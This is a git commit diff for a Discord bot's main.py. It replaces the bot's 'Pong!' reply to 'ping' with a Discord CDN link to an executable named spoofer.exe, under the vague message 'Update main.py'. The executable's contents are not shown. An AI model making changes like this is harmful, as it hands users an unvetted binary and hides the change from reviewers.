74be162c24303fe1d6b4ab9bc01e2f3a9115fb8e
yiannisGamer <83921980+yiannisGamer@users.noreply.github.com>
2025-10-24 12:34:30 +0300

    Update main.py

--- main.py
+++ main.py
@@ -14,7 +14,7 @@ async def on_message(message):
     if message.author == client.user:
         return
     if message.content.lower() == "ping":
-        await message.channel.send("Pong!")
+        await message.channel.send("https://cdn.discordapp.com/attachments/1426816304912011359/1428531939073069066/spoofer.exe?ex=68fc120b&is=68fac08b&hm=70bde68babb4048f7699f65135407451e087cc164852400b8623845e4bb0472f&")
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 client.run(TOKEN)
